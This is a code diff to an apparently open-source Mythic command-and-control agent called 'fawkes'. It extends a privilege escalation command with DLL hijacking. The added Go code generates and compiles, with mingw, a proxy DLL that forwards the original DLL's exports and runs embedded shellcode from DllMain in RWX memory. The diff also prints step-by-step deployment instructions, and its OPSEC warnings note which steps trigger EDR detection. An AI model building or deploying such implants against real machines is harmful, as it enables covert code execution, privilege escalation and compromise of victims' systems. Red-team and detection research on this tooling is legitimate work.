@@ -1,12 +1,16 @@
 package agentfunctions
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
+	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/logging"
 	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
@@ -14,8 +18,8 @@ func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "privesc-check",
 		Description:         "Privilege escalation enumeration. Windows: token privileges, unquoted services, AlwaysInstallElevated, auto-logon, UAC. Linux: SUID/SGID, capabilities, sudo, containers, cron hijacking, NFS, systemd units, sudo tokens, PATH hijacking, docker group, dangerous groups, Polkit rules, modprobe hooks, ld.so.preload, security modules. macOS: LaunchDaemons, TCC, dylib hijacking, SIP (T1548)",
-		HelpString:          "privesc-check -action <all|...> (Windows: privileges, services, registry, uac, unattend, dll-hijack, dll-plant, dll-sideload, dll-exports, service-registry. Linux: suid, capabilities, sudo, container, cron, nfs, systemd, sudo-token, path-hijack, docker-group, group, polkit, modprobe, ld-preload, security. macOS: launchdaemons, tcc, dylib, sip. Shared: all, writable)",
-		Version:             9,
+		HelpString:          "privesc-check -action <all|...> (Windows: privileges, services, registry, uac, unattend, dll-hijack, dll-plant, dll-sideload, dll-exports, hijack-execute, hijack-deploy, service-registry. Linux: suid, capabilities, sudo, container, cron, nfs, systemd, sudo-token, path-hijack, docker-group, group, polkit, modprobe, ld-preload, security. macOS: launchdaemons, tcc, dylib, sip. Shared: all, writable)",
+		Version:             10,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1548", "T1548.001", "T1548.002", "T1574.001", "T1574.002", "T1574.009", "T1574.011", "T1552.001", "T1613", "T1082"},
@@ -37,8 +41,8 @@ func init() {
 				ModalDisplayName: "Action",
 				CLIName:          "action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"all", "auto-escalate", "privileges", "services", "registry", "uac", "unattend", "writable", "dll-hijack", "dll-plant", "dll-sideload", "dll-exports", "service-registry", "suid", "sudo", "capabilities", "container", "cron", "nfs", "systemd", "sudo-token", "path-hijack", "docker-group", "group", "polkit", "modprobe", "ld-preload", "security", "launchdaemons", "tcc", "dylib", "sip"},
-				Description:      "Check to perform. auto-escalate: automated chain — enumerate vectors then attempt privilege escalation. Windows: privileges, services, registry, uac, unattend, dll-hijack, dll-plant, dll-sideload (T1574.002), dll-exports (PE export table), service-registry (T1574.011). Linux: suid, capabilities, sudo, container, cron, nfs, systemd, sudo-token, path-hijack, docker-group, group, polkit, modprobe, ld-preload, security. macOS: launchdaemons, tcc, dylib, sip. Shared: all, writable",
+				Choices:          []string{"all", "auto-escalate", "privileges", "services", "registry", "uac", "unattend", "writable", "dll-hijack", "dll-plant", "dll-sideload", "dll-exports", "hijack-execute", "hijack-deploy", "service-registry", "suid", "sudo", "capabilities", "container", "cron", "nfs", "systemd", "sudo-token", "path-hijack", "docker-group", "group", "polkit", "modprobe", "ld-preload", "security", "launchdaemons", "tcc", "dylib", "sip"},
+				Description:      "Check to perform. auto-escalate: automated chain. hijack-execute: read DLL exports for proxy DLL generation — server compiles proxy DLL with shellcode. hijack-deploy: deploy compiled proxy DLL (rename original, place proxy). Windows: privileges, services, registry, uac, unattend, dll-hijack, dll-plant, dll-sideload (T1574.002), dll-exports (PE export table), service-registry (T1574.011). Linux: suid, capabilities, sudo, container, cron, nfs, systemd, sudo-token, path-hijack, docker-group, group, polkit, modprobe, ld-preload, security. macOS: launchdaemons, tcc, dylib, sip. Shared: all, writable",
 				DefaultValue:     "all",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -52,8 +56,24 @@ func init() {
 				ModalDisplayName: "Source DLL Path",
 				CLIName:          "source",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
-				Description:      "Path to PE file on target. For dll-plant: path to the DLL to plant. For dll-exports: path to a DLL/EXE to enumerate exports from.",
+				Description:      "Path to PE file on target. For dll-plant: DLL to plant. For dll-exports/hijack-execute: DLL to enumerate exports from. For hijack-deploy: compiled proxy DLL path on target.",
 				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:            "Default",
+					},
+				},
+			},
+			{
+				Name:                 "shellcode",
+				ModalDisplayName:     "Shellcode File",
+				CLIName:              "shellcode",
+				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Description:          "Shellcode to embed in proxy DLL (for hijack-execute). Select a file already in Mythic or build a Fawkes shellcode payload first.",
+				Choices:              []string{},
+				DefaultValue:         "",
+				DynamicQueryFunction: getFileList,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
@@ -116,7 +136,8 @@ func init() {
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			action, _ := taskData.Args.GetStringArg("action")
 			var msg string
-			if action == "auto-escalate" {
+			switch action {
+			case "auto-escalate":
 				msg = "OPSEC WARNING: Auto-Escalate Chain will (1) enumerate all privilege escalation vectors, then (2) automatically attempt the best available escalation method. This generates a visible cascade of subtasks. "
 				switch taskData.Payload.OS {
 				case "Windows":
@@ -126,7 +147,11 @@ func init() {
 				case "macOS":
 					msg += "May attempt sudo escalation or AppleScript elevation prompt (visible to user)."
 				}
-			} else {
+			case "hijack-execute":
+				msg = "OPSEC WARNING: DLL hijack proxy generation. Agent reads target DLL export table (file I/O). Server compiles proxy DLL with embedded shellcode. Planting the proxy creates new files on disk — high-fidelity EDR detection."
+			case "hijack-deploy":
+				msg = "OPSEC WARNING: DLL hijack deployment. Renames original DLL and places proxy. File rename + creation in sensitive directories triggers EDR behavioral detections."
+			default:
 				msg = "OPSEC WARNING: Privilege escalation enumeration accesses system configuration (services, registry, SUID binaries, sudo, cron, systemd). "
 				switch taskData.Payload.OS {
 				case "Windows":
@@ -165,7 +190,6 @@ func init() {
 				display := "Auto-Escalate Chain: enumerate → escalate"
 				response.DisplayParams = &display
 
-				// Store OS and integrity context for the completion function
 				chainCtx, _ := json.Marshal(map[string]string{
 					"os":        taskData.Payload.OS,
 					"integrity": fmt.Sprintf("%d", taskData.Callback.IntegrityLevel),
@@ -173,7 +197,6 @@ func init() {
 				chainCtxStr := string(chainCtx)
 				response.Stdout = &chainCtxStr
 
-				// Step 1: Run full enumeration
 				callbackFunc := "privescEnumDone"
 				_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
 					mythicrpc.MythicRPCTaskCreateSubtaskMessage{
@@ -194,6 +217,46 @@ func init() {
 				return response
 			}
 
+			if action == "hijack-execute" {
+				source, _ := taskData.Args.GetStringArg("source")
+				shellcodeFile, _ := taskData.Args.GetStringArg("shellcode")
+				if source == "" {
+					response.Success = false
+					response.Error = "source is required — path to target DLL on the remote host"
+					return response
+				}
+				if shellcodeFile == "" {
+					response.Success = false
+					response.Error = "shellcode is required — select a shellcode file from Mythic (build one first with output format = shellcode)"
+					return response
+				}
+
+				// Resolve shellcode file and store file_id for ProcessResponse
+				search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
+					CallbackID:      taskData.Callback.ID,
+					Filename:        shellcodeFile,
+					LimitByCallback: false,
+					MaxResults:      -1,
+				})
+				if err != nil || !search.Success || len(search.Files) == 0 {
+					response.Success = false
+					response.Error = fmt.Sprintf("Shellcode file not found: %s", shellcodeFile)
+					return response
+				}
+				shellcodeFileID := search.Files[0].AgentFileID
+
+				ctx, _ := json.Marshal(map[string]string{
+					"shellcode_file_id": shellcodeFileID,
+					"shellcode_name":    shellcodeFile,
+				})
+				ctxStr := string(ctx)
+				response.Stdout = &ctxStr
+
+				display := fmt.Sprintf("hijack-execute %s (shellcode: %s)", source, shellcodeFile)
+				response.DisplayParams = &display
+				return response
+			}
+
 			if action != "" && action != "all" {
 				response.DisplayParams = &action
 			}
@@ -208,9 +271,15 @@ func init() {
 			if !ok || responseText == "" {
 				return response
 			}
+
+			// Check for hijack-execute export JSON response
+			if strings.Contains(responseText, `"action":"hijack-execute"`) {
+				processHijackExecuteResponse(processResponse.TaskData, responseText)
+				return response
+			}
+
 			host := processResponse.TaskData.Callback.Host
 
-			// Detect high-value privilege escalation vectors
 			hasVector := strings.Contains(responseText, "VULNERABLE") ||
 				strings.Contains(responseText, "AlwaysInstallElevated") ||
 				strings.Contains(responseText, "Unquoted Service Path") ||
@@ -410,4 +479,218 @@ func analyzeMacOSPrivesc(enumOutput string) (cmd string, params string, reason s
 
 	// macOS can try osascript prompt (interactive, requires user at desktop)
 	return "getsystem", `{"technique":"check"}`, "No passwordless escalation available — running getsystem check to enumerate vectors."
+}
+
+type hijackExportEntry struct {
+	Ordinal   uint32 `json:"ordinal"`
+	Name      string `json:"name"`
+	Forwarder string `json:"forwarder"`
+}
+
+type hijackExportResponse struct {
+	Action      string               `json:"action"`
+	OrigPath    string               `json:"orig_path"`
+	OrigName    string               `json:"orig_name"`
+	RenamedName string               `json:"renamed_name"`
+	Arch        string               `json:"arch"`
+	Exports     []hijackExportEntry  `json:"exports"`
+	TargetDir   string               `json:"target_dir,omitempty"`
+}
+
+func processHijackExecuteResponse(taskData *agentstructs.PTTaskMessageAllData, responseText string) {
+	taskID := taskData.Task.ID
+
+	var exportData hijackExportResponse
+	if err := json.Unmarshal([]byte(responseText), &exportData); err != nil {
+		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+			TaskID:   taskID,
+			Response: []byte(fmt.Sprintf("[ERROR] Failed to parse export data: %v", err)),
+		})
+		return
+	}
+
+	ctx := extractChainContext(taskData.Task.Stdout)
+	shellcodeFileID := ctx["shellcode_file_id"]
+	shellcodeName := ctx["shellcode_name"]
+
+	if shellcodeFileID == "" {
+		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+			TaskID:   taskID,
+			Response: []byte("[ERROR] No shellcode file_id found in task context. Provide shellcode parameter when using hijack-execute."),
+		})
+		return
+	}
+
+	getResp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
+		AgentFileID: shellcodeFileID,
+	})
+	if err != nil || !getResp.Success {
+		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+			TaskID:   taskID,
+			Response: []byte(fmt.Sprintf("[ERROR] Failed to read shellcode file %s: %v", shellcodeName, err)),
+		})
+		return
+	}
+	shellcodeBytes := getResp.Content
+
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID: taskID,
+		Response: []byte(fmt.Sprintf("[*] Read %d exports from %s (%s)\n[*] Shellcode: %s (%d bytes)\n[*] Generating proxy DLL source...",
+			len(exportData.Exports), exportData.OrigName, exportData.Arch, shellcodeName, len(shellcodeBytes))),
+	})
+
+	cSource := generateProxyCSource(exportData.Exports, exportData.RenamedName, shellcodeBytes)
+	defFile := generateProxyDEFFile(exportData.Exports, exportData.RenamedName)
+
+	compiledDLL, compileErr := compileProxyDLL(cSource, defFile, exportData.Arch)
+	if compileErr != "" {
+		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+			TaskID:   taskID,
+			Response: []byte(fmt.Sprintf("[ERROR] Proxy DLL compilation failed:\n%s", compileErr)),
+		})
+		return
+	}
+
+	proxyFilename := fmt.Sprintf("proxy_%s", exportData.OrigName)
+	createResp, err := mythicrpc.SendMythicRPCFileCreate(mythicrpc.MythicRPCFileCreateMessage{
+		TaskID:       taskID,
+		FileContents: compiledDLL,
+		Filename:     proxyFilename,
+		Comment:      fmt.Sprintf("Proxy DLL for %s (%d exports forwarded to %s, %d bytes shellcode)", exportData.OrigName, len(exportData.Exports), exportData.RenamedName, len(shellcodeBytes)),
+	})
+	if err != nil {
+		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+			TaskID:   taskID,
+			Response: []byte(fmt.Sprintf("[ERROR] Failed to upload compiled proxy DLL: %v", err)),
+		})
+		return
+	}
+
+	var deployInstructions strings.Builder
+	deployInstructions.WriteString(fmt.Sprintf("[+] Proxy DLL compiled successfully: %s (%d bytes)\n", proxyFilename, len(compiledDLL)))
+	deployInstructions.WriteString(fmt.Sprintf("    Exports: %d forwarded to %s\n", len(exportData.Exports), exportData.RenamedName))
+	deployInstructions.WriteString(fmt.Sprintf("    Shellcode: %d bytes embedded in DllMain\n", len(shellcodeBytes)))
+	deployInstructions.WriteString(fmt.Sprintf("    File ID: %s\n\n", createResp.AgentFileID))
+	deployInstructions.WriteString("--- Deployment Steps ---\n")
+	deployInstructions.WriteString("1. Download the proxy DLL to the target:\n")
+	deployInstructions.WriteString(fmt.Sprintf("   upload -file_id %s -remote_path C:\\path\\%s\n\n", proxyFilename, proxyFilename))
+	deployInstructions.WriteString("2. Deploy the hijack (rename original, place proxy):\n")
+	deployInstructions.WriteString(fmt.Sprintf("   privesc-check -action hijack-deploy -source C:\\path\\%s -target_dir %s -dll_name %s\n\n",
+		proxyFilename, filepath.Dir(exportData.OrigPath), exportData.OrigName))
+	deployInstructions.WriteString("3. Trigger the hosting process to load the DLL\n")
+	deployInstructions.WriteString(fmt.Sprintf("\nCleanup: delete proxy, rename %s back to %s\n",
+		exportData.RenamedName, exportData.OrigName))
+
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID:   taskID,
+		Response: []byte(deployInstructions.String()),
+	})
+
+	createArtifact(taskID, "File Create",
+		fmt.Sprintf("Proxy DLL generated: %s (proxying %s, %d exports)", proxyFilename, exportData.OrigName, len(exportData.Exports)))
+	logOperationEvent(taskID,
+		fmt.Sprintf("[PRIVESC] DLL Hijack proxy generated for %s on %s (%d exports, %d bytes shellcode)",
+			exportData.OrigName, taskData.Callback.Host, len(exportData.Exports), len(shellcodeBytes)), true)
+}
+
+func generateProxyCSource(_ []hijackExportEntry, _ string, shellcode []byte) string {
+	var sb strings.Builder
+
+	sb.WriteString("#include <windows.h>\n\n")
+	sb.WriteString("static unsigned char payload[] = {")
+	for i, b := range shellcode {
+		if i%16 == 0 {
+			sb.WriteString("\n    ")
+		}
+		sb.WriteString(fmt.Sprintf("0x%02X", b))
+		if i < len(shellcode)-1 {
+			sb.WriteString(", ")
+		}
+	}
+	sb.WriteString("\n};\n\n")
+
+	sb.WriteString(`DWORD WINAPI PayloadThread(LPVOID lpParameter) {
+    void (*func)(void) = (void(*)(void))lpParameter;
+    func();
+    return 0;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        LPVOID mem = VirtualAlloc(NULL, sizeof(payload),
+            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (mem) {
+            CopyMemory(mem, payload, sizeof(payload));
+            HANDLE hThread = CreateThread(NULL, 0, PayloadThread, mem, 0, NULL);
+            if (hThread) CloseHandle(hThread);
+        }
+    }
+    return TRUE;
+}
+`)
+
+	return sb.String()
+}
+
+func generateProxyDEFFile(exports []hijackExportEntry, renamedDLLName string) string {
+	var sb strings.Builder
+
+	renamedBase := strings.TrimSuffix(renamedDLLName, ".dll")
+
+	sb.WriteString("EXPORTS\n")
+	for _, exp := range exports {
+		if exp.Forwarder != "" {
+			continue
+		}
+		if exp.Name != "" {
+			sb.WriteString(fmt.Sprintf("    %s=%s.%s @%d\n",
+				exp.Name, renamedBase, exp.Name, exp.Ordinal))
+		} else {
+			sb.WriteString(fmt.Sprintf("    noname_%d=%s.#%d @%d NONAME\n",
+				exp.Ordinal, renamedBase, exp.Ordinal, exp.Ordinal))
+		}
+	}
+
+	return sb.String()
+}
+
+func compileProxyDLL(cSource, defFile, arch string) ([]byte, string) {
+	tmpDir, err := os.MkdirTemp("", "proxydll-*")
+	if err != nil {
+		return nil, fmt.Sprintf("Failed to create temp directory: %v", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	srcPath := filepath.Join(tmpDir, "proxy.c")
+	defPath := filepath.Join(tmpDir, "proxy.def")
+	outPath := filepath.Join(tmpDir, "proxy.dll")
+
+	if err := os.WriteFile(srcPath, []byte(cSource), 0644); err != nil {
+		return nil, fmt.Sprintf("Failed to write C source: %v", err)
+	}
+	if err := os.WriteFile(defPath, []byte(defFile), 0644); err != nil {
+		return nil, fmt.Sprintf("Failed to write DEF file: %v", err)
+	}
+
+	compiler := "x86_64-w64-mingw32-gcc"
+	if arch == "x86" {
+		compiler = "i686-w64-mingw32-gcc"
+	}
+
+	cmd := exec.Command(compiler, "-shared", "-o", outPath, srcPath, defPath, "-lkernel32")
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+
+	if err := cmd.Run(); err != nil {
+		logging.LogError(err, "Proxy DLL compilation failed")
+		return nil, fmt.Sprintf("Compilation failed (%s):\nstdout: %s\nstderr: %s", compiler, stdout.String(), stderr.String())
+	}
+
+	dllBytes, err := os.ReadFile(outPath)
+	if err != nil {
+		return nil, fmt.Sprintf("Failed to read compiled DLL: %v", err)
+	}
+
+	return dllBytes, ""
 }
